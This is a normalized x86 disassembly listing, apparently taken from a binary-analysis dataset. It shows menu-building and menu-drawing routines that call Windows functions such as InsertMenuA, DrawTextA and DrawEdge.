call sub_43fe18
test al al
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032a0
mov eax [ eax + 0x6c ]
mov edx [ ebx + 0x18 ]
movzx edx [ edx + 0x3f ]
cmp eax edx
je r-xdata
mov al 0x1
pop ebx
retn
sub_44336c
push ebx
mov ebx eax
mov eax ebx
call sub_43fe68
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032a0
mov eax [ eax + 0x80 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4433a0
push ebx
mov ebx eax
mov eax ebx
call sub_43fe7c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032a0
mov ax [ eax + 0x84 ]
mov edx [ ebx + 0x18 ]
cmp ax [ edx + 0x60 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4433d4
push ebx
mov ebx eax
mov eax ebx
call sub_43fe90
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032a0
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x3e ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_443408
push ebx
mov ebx eax
mov eax ebx
call sub_41a3fc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x88 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_443430
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0xa8 ] bl
sub_443450
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_445490
sub_443470
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_445500
sub_443490
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_445554
sub_4434b0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov [ eax + 0x54 ] esi
sub_4434cc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x58
mov edx esi
call sub_403f00
sub_4434f0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_445680
sub_443510
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_44565c
sub_443530
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_445670
sub_443550
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x88 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x8c ] edx
sub_44357c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_419b0c
mov [ ebx + 0x3e ] 0x1
mov [ ebx + 0x39 ] 0x1
mov [ ebx + 0x3b ] 0x2
mov [ ebx + 0x3c ] 0x2
call sub_443068
mov [ ebx + 0x50 ] ax
mov [ ebx + 0x40 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov esi eax
mov [ ebx + 0x78 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_445f8c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_4435f8
push ebx
push esi
call sub_403464
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_447f28
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
mov eax esi
call sub_445628
test eax eax
jg r-xdata
mov edx esi
call sub_4459c0
xor eax eax
mov [ esi + 0x64 ] eax
jmp r-xdata
xor edx edx
mov eax esi
call sub_445638
call sub_4030f0
cmp [ esi + 0x34 ] 0x0
je r-xdata
mov eax [ esi + 0x5c ]
call sub_4030f0
lea eax [ esi + 0x44 ]
call sub_40cb14
lea eax [ esi + 0x78 ]
call sub_40cb14
mov ax [ esi + 0x50 ]
test ax ax
je r-xdata
xor edx edx
mov eax esi
call sub_443a14
mov eax [ esi + 0x34 ]
push eax
call DestroyMenu
mov eax [ esi + 0x4c ]
test eax eax
je r-xdata
movzx edx ax
xor ecx ecx
mov eax [ rw-data ]
call sub_413d8c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419b58
test bl bl
jle r-xdata
call sub_4030f0
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_4436ac
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x1 ] cl
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_443907
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x3e ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44390e
lea eax [ ebp - 0x40 ]
call sub_403eac
lea eax [ ebp - 0x8 ]
call sub_403eac
retn
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x30 ]
call sub_403f44
mov eax ebx
call sub_445628
test eax eax
jle r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
mov eax ebx
call sub_443bbc
mov [ ebp - 0x25 ] eax
jmp r-xdata
call GetVersion
and eax 0xff
cmp ax 0x4
jb r-xdata
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_4042b8
sete al
and eax 0x7f
mov esi [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x48 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x38 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
or esi eax
or esi 0x400
mov eax ebx
call sub_445628
test eax eax
jle r-xdata
mov [ ebp - 0x39 ] 0x2c
mov [ ebp - 0x35 ] 0x3f
mov eax ebx
call sub_445be4
mov esi eax
test esi esi
je r-xdata
push [ ebp - 0x8 ]
push r-xdata
lea edx [ ebp - 0x40 ]
mov ax [ ebx + 0x60 ]
call sub_442d10
push [ ebp - 0x40 ]
lea eax [ ebp - 0x8 ]
mov edx 0x3
call sub_40422c
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_40436c
push eax
movzx eax [ ebx + 0x50 ]
push eax
push esi
push 0xffffffff
push edi
call InsertMenuA
mov eax [ ebx + 0x30 ]
call sub_40436c
push eax
mov eax ebx
call sub_443bbc
push eax
or esi 0x10
push esi
push 0xffffffff
push edi
call InsertMenuA
jmp r-xdata
cmp [ ebx + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0x40 ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_40327c
test al al
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_445200
test eax eax
jne r-xdata
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_4042b8
sete al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3d ]
mov edx [ edx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x48 ]
or edx [ ecx * 4 + rw-data ]
or eax edx
xor edx edx
mov dl [ ebp - 0x1 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebp - 0x9 ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x31 ] eax
xor eax eax
mov al [ ebx + 0x38 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3a ]
or eax [ edx * 4 + rw-data ]
mov [ ebp - 0x2d ] eax
movzx eax [ ebx + 0x50 ]
mov [ ebp - 0x29 ] eax
xor eax eax
mov [ ebp - 0x25 ] eax
xor eax eax
mov [ ebp - 0x21 ] eax
xor eax eax
mov [ ebp - 0x1d ] eax
mov eax [ ebp - 0x8 ]
call sub_40436c
mov [ ebp - 0x15 ] eax
mov eax ebx
call sub_445628
test eax eax
jle r-xdata
lea eax [ ebp - 0x39 ]
push eax
push 0xffffffff
push 0xffffffff
push edi
call InsertMenuItemA
jmp r-xdata
mov eax ebx
call sub_443bbc
mov [ ebp - 0x25 ] eax
sub_443927
inc [ ecx ]
add [ eax ] al
add [ 0x55000000 ] ch
mov ebp esp
mov edx [ ebp + 0x8 ]
mov cl [ edx - 0x5 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x34 ]
call sub_4436ac
xor eax eax
pop ebp
retn
sub_44394c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x70 ]
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_447220
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4461e8
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4466e4
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax r-xdata
mov ecx [ ebp - 0x4 ]
call sub_4430e8
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_4439bc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_443a06
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_418734
mov eax [ ebp - 0x4 ]
call sub_442f70
mov edx eax
mov eax ebx
call sub_44565c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443a0d
lea eax [ ebp - 0x4 ]
call sub_403eac
retn
sub_443a14
push ebx
mov ebx eax
test edx edx
je r-xdata
mov eax [ ebx + 0x68 ]
cmp edx eax
je r-xdata
test [ edx + 0x1c ] 0x8
jne r-xdata
pop ebx
retn
test eax eax
je r-xdata
mov eax edx
mov [ ebx + 0x68 ] eax
test eax eax
je r-xdata
xor ecx ecx
mov [ eax + 0x6c ] ecx
mov eax ebx
call sub_443a8c
mov [ eax + 0x6c ] ebx
mov edx ebx
call sub_419bdc
sub_443a50
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_419f5c
mov eax ebx
call sub_445610
test eax eax
je r-xdata
cmp [ ebx + 0x74 ] 0x0
je r-xdata
mov eax ebx
call sub_445610
mov edx eax
mov cl 0x1
mov eax ebx
mov si 0xffef
call sub_4032ec
pop esi
pop ebx
retn
mov eax ebx
call sub_443a8c
sub_443a8c
push ebx
push esi
push edi
push ebp
mov ebp eax
test [ ebp + 0x1c ] 0x8
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebp + 0x1c ] 0x2
je r-xdata
mov eax [ ebp + 0x6c ]
test eax eax
je r-xdata
mov [ ebp + 0x74 ] 0x1
jmp r-xdata
mov eax ebp
call sub_443bbc
push eax
call GetMenuItemCount
mov esi eax
test esi esi
sete bl
test esi esi
jle r-xdata
call sub_443a8c
jmp r-xdata
test bl bl
je r-xdata
push 0x400
mov edi esi
dec edi
push edi
mov eax ebp
call sub_443bbc
push eax
call GetMenuState
test al 0x4
jne r-xdata
cmp [ ebp + 0x64 ] 0x0
jne r-xdata
dec esi
test esi esi
jg r-xdata
push 0x400
push edi
mov eax ebp
call sub_443bbc
push eax
call RemoveMenu
mov bl 0x1
mov eax ebp
call sub_44394c
mov eax [ ebp + 0x70 ]
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
mov eax ebp
call sub_443bbc
push eax
call GetMenuItemCount
test eax eax
jne r-xdata
mov eax [ ebp + 0x34 ]
push eax
call DestroyMenu
xor eax eax
mov [ ebp + 0x34 ] eax
jmp r-xdata
xor edx edx
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_443b5c
push ebx
push esi
push edi
push ebp
push ecx
mov ebx ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_445628
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx ebp
mov eax edi
call sub_445638
cmp bl [ eax + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax edi
call sub_445638
cmp bl [ eax + 0x3f ]
jae r-xdata
inc ebp
dec esi
jne r-xdata
mov edx ebp
mov eax edi
call sub_445638
mov [ eax + 0x3f ] bl
mov eax [ rw-data ]
call sub_442c64
jmp r-xdata
cmp ebp [ esp ]
jge r-xdata
sub_443bbc
push ebx
mov ebx eax
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov eax [ ebx + 0x34 ]
pop ebx
retn
mov eax [ ebx + 0x4 ]
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
call CreateMenu
mov [ ebx + 0x34 ] eax
call CreatePopupMenu
mov [ ebx + 0x34 ] eax
jmp r-xdata
mov eax ebx
call sub_44394c
mov eax [ rw-data ]
call sub_442c64
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
sub_443c08
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_419e84
push ebx
push sub_4439bc
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_443c4c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_443e30
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_445be4
mov edi eax
test edi edi
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_403f44
test bh 0x4
je r-xdata
mov eax edi
call sub_447220
test al al
je r-xdata
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4042b8
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
test bl 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_41d440
cmp [ esi + 0x3a ] 0x0
je r-xdata
test bh 0x4
jne r-xdata
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404174
mov eax [ ebp - 0xc ]
cmp [ eax ] 0x26
jne r-xdata
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
and ebx 0xffffffff
or ebx 0x2
jmp r-xdata
cmp [ esi + 0x39 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0xc ]
mov eax edi
call sub_41ce18
mov edx eax
or dl [ r-xdata ]
mov eax edi
call sub_41ce24
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443e37
lea eax [ ebp - 0xc ]
call sub_403eac
retn
mov eax [ ebp + 0x10 ]
mov esi eax
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add [ ebp - 0x18 ] 0x4
push 0x2
push 0x6
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_41dadc
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
or ebx 0x20000
and ebx 0xfffffffd
or ebx 0x0
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_40416c
push eax
mov eax [ ebp - 0xc ]
call sub_40436c
push eax
mov eax [ ebp - 0x4 ]
call sub_41dadc
push eax
call DrawTextA
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_41cb58
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_40416c
push eax
mov eax [ ebp - 0xc ]
call sub_40436c
push eax
mov eax [ ebp - 0x4 ]
call sub_41dadc
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_41cb58
mov eax 0xff00000d
call sub_41c698
mov esi eax
mov eax 0xff000010
call sub_41c698
cmp esi eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_41cb58
jmp r-xdata
sub_443e9c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_444784
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d6c8
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_41d324
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_41cb58
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_4042b8
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_41d324
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d6c8
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xfffffffc
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_440c60
cmp ebx eax
jl r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41dadc
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41d31c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_41d324
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4201d4
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_4442e3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
